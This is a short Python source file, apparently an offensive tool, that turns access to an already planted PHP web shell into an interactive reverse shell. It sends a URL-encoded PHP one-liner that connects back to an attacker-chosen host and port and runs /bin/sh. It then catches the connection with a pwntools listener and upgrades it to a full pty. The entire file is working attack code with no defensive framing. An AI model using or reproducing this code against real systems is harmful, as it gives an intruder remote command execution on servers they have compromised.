import requests, sys, tty
from pwnlib.tubes.listen import listen
from pwnlib.log import getLogger


class ShellService:
    def __init__(self, web_shell_url: str, lhost: str, lport: int):
        self.web_shell_url = web_shell_url
        self.lhost = lhost
        self.lport = lport

    def prepare_listener(self) -> listen:
        listener = listen(self.lport)

        return listener

    def execute_rev_shell(self):
        php_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
        payload = requests.utils.quote(f"php -r '{php_code}'")

        try:
            requests.get(f'{self.web_shell_url}?omega={payload}', timeout=2)
        except requests.exceptions.ReadTimeout:
            pass
    
    def stabilize_shell(self, shell: listen):
        # Get pty
        shell.sendline(b"""python -c 'import pty; pty.spawn("/bin/bash")'; exit""")
        shell.recv(timeout = None) # Wait for pty to spawn
        shell.sendline(b'export TERM=xterm')
        shell.clean()
        shell.sendline(b'')

        tty.setraw(sys.stdin.fileno())
